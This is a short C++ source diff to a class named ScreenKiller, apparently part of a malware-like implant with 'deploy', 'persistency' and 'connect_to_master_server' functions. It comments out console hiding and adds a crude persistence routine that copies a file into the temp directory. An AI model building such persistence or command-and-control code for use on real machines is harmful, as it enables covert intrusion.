@@ -18,7 +18,7 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	this->runner_thread = std::thread([this] {this->deploy_inner(); });
 }
@@ -69,7 +69,16 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	return false;
+	char filename[] = "mystery";
+	char temp_path[MAX_PATH];
+
+	GetTempPathA(MAX_PATH, temp_path);
+
+	strcat_s(temp_path, MAX_PATH, filename);
+
+	std::cout << temp_path << std::endl;
+
+	return CopyFileA(filename, temp_path, false) != 0;
 }
 
 bool ScreenKiller::connect_to_master_server()
